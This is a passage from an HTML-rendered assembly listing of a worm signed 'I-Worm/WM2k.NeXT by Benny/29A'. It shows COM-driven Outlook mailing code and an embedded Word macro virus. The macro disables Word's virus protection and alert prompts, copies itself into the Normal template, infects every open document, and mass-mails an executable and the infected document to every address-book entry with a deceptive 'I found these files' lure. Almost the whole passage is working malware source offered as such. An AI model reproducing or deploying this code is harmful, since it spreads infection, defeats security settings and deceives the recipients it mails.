    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc12">'a'</span><span class="sc4">,</span><span class="sc12">'s'</span><span class="sc4">,</span><span class="sc12">'e'</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'c'</span><span class="sc4">,</span><span class="sc12">'h'</span><span class="sc4">,</span><span class="sc12">'e'</span><span class="sc4">,</span><span class="sc12">'c'</span><span class="sc4">,</span><span class="sc12">'k'</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'i'</span><span class="sc4">,</span><span class="sc12">'t'</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'o'</span><span class="sc4">,</span><span class="sc12">'u'</span><span class="sc4">,</span><span class="sc12">'t'</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc12">'a'</span><span class="sc4">,,</span><span class="sc12">'n'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'g'</span><span class="sc4">,</span><span class="sc12">'i'</span><span class="sc4">,</span><span class="sc12">'v'</span><span class="sc4">,</span><span class="sc12">'e'</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'m'</span><span class="sc4">,</span><span class="sc12">'e'</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'k'</span><span class="sc4">,</span><span class="sc12">'n'</span><span class="sc4">,,</span><span class="sc12">'o'</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc12">'w'</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc4">,,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc12">'T'</span><span class="sc4">,</span><span class="sc12">'h'</span><span class="sc4">,</span><span class="sc12">'a'</span><span class="sc4">,</span><span class="sc12">'n'</span><span class="sc4">,</span><span class="sc12">'k'</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc12">'y'</span><span class="sc4">,</span><span class="sc12">'o'</span><span class="sc4">,</span><span class="sc12">'u'</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@body</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">argument_union</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">9100h</span><span class="sc0">           </span><span class="sc1">;.Body</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DispInvoke_Put</span><span class="sc0">

    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dispatcher_params.Argument_Count</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0F815h</span><span class="sc0">          </span><span class="sc1">;.Attachments</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DispInvoke_Get</span><span class="sc0">


    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sysdir</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">SysAllocString</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dispatcher_params.Argument_Count</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">argument_union</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">65h</span><span class="sc0">             </span><span class="sc1">;.Add</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DispInvoke</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">SysFreeString</span><span class="sc0">

    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dispatcher_params.Argument_Count</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0F075h</span><span class="sc0">          </span><span class="sc1">;.Send</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DispInvoke</span><span class="sc0">

    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@l2</span><span class="sc0">             </span><span class="sc1">;first loop</span><span class="sc0">

    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@l1</span><span class="sc0">             </span><span class="sc1">;second loop</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_tw</span><span class="sc0">              </span><span class="sc1">;terminate thread</span><span class="sc0">
</span><span class="sc5">Thread_Outlook</span><span class="sc0">  </span><span class="sc9">EndP</span><span class="sc0">





</span><span class="sc1">;dispatcher call procedure</span><span class="sc0">

</span><span class="sc5">DispInvoke_Put</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">               </span><span class="sc1">;DISPATCH_PROPERTYPUT</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">dig2</span><span class="sc0">
</span><span class="sc5">DispInvoke</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">;DISPATCH_METHOD</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">dig2</span><span class="sc0">
</span><span class="sc5">DispInvoke_Get</span><span class="sc0">  </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">               </span><span class="sc1">;DISPATCH_PROPERTYGET</span><span class="sc0">
</span><span class="sc5">dig2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">variant_result</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dispatcher_params</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">800h</span><span class="sc0">                </span><span class="sc1">;LOCALE_SYSTEM_DEFAULT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">IID_NULL</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;IDispatch::Invoke</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">result_union</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">DispInvoke_Get</span><span class="sc0">  </span><span class="sc9">EndP</span><span class="sc0">


</span><span class="sc5">signature</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'I-Worm/WM2k.NeXT by Benny/29A'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">winword_CLSID</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">000209FFh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">46h</span><span class="sc0">

</span><span class="sc5">winword_interface</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00020400h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">46h</span><span class="sc0">

</span><span class="sc5">outlook_CLSID</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0006F03Ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">46h</span><span class="sc0">

</span><span class="sc5">outlook_interface</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00020400h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">46h</span><span class="sc0">

</span><span class="sc5">wm_macro</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Sub AutoOpen()"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"On Error Resume Next"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Application.ScreenUpdating = False"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Application.DisplayAlerts = wdAlertsNone"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Options.SaveNormalPrompt = False"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Options.VirusProtection = False"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:=""Module1"", Object:=wdOrganizerObjectProjectItems"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"End Sub"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Sub FileSave()"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"On Error Resume Next"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Set fso = CreateObject(""Scripting.FileSystemObject"")"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Set DirSys = fso.GetSpecialFolder(1)"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"vcode = DirSys &amp; ""\win32k.dll"""</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"ThisDocument.VBProject.VBComponents(2).Export (vcode)"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"If NormalTemplate.VBProject.VBComponents.Count = 2 Then"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"    NormalTemplate.VBProject.VBComponents(2).Export (vcode)"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"End If"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"For i = 1 To Documents.Count"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"    installed = False"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"    If Documents(i).VBProject.VBComponents.Count = 2 Then"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"        If Documents(i).VBProject.VBComponents(2).Name = ""Module1"" Then"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"            installed = True"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"        End If"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"    End If"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"    If installed = False Then"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"        Documents(i).VBProject.VBComponents.Import (vcode)"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"        Documents(i).Save"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"    End If"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Next"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"If ActiveDocument.VBProject.VBComponents.Count = 2 Then"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"    If ActiveDocument.VBProject.VBComponents(2).Name = ""Module1"" Then"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:=""Module1"", Object:=wdOrganizerObjectProjectItems"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"    End If"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"End If"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"NormalTemplate.Save"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Set Outlook = CreateObject(""Outlook.Application"")"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Set mapi = Outlook.GetNameSpace(""MAPI"")"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"ThisDocument.Save"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"doc = ThisDocument.FullName"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"For i = 1 To mapi.AddressLists.Count"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"    Set a = mapi.AddressLists(i)"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"    For x = 1 To a.AddressEntries.Count"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"        Set newMail = Outlook.CreateItem(0)"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"        newMail.Recipients.Add (a.AddressEntries(x))"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"        newMail.Subject = ""You should look at this"""</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"        newMail.Body = ""Hello,"" &amp; vbCrLf &amp; ""I found these files on my HDD and it seems it's yours. Please check them out and give me know."" &amp; vbCrLf &amp; ""Thank you."""</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"        newMail.Attachments.Add (DirSys &amp; ""\next.exe"")"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"        newMail.Attachments.Add (doc)"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"        newMail.Send"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"    Next"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Next"</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"End Sub"</span><span class="sc0">
</span><span class="sc5">end_wm_macro</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">End</span><span class="sc0"> </span><span class="sc5">Start</span></div></body>
</html>
